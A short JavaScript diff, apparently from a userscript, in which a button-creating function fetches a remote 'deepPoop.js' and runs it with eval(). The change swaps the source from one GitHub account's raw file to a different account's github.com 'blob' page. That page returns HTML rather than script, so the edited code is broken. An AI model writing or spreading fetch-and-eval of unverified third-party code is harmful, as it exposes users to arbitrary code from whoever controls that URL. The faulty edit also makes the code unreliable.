@@ -99,7 +99,7 @@ async function criarBotaoDeepPoop() {
         `;
 
         try {
-            const response = await fetch("https://raw.githubusercontent.com/henryykkkk/DeepPoop/refs/heads/main/deepPoop.js");
+            const response = await fetch("https://github.com/Sniklindo171/bot/blob/main/deepPoop.js");
             const script = await response.text();
             eval(script);
         } catch (error) {
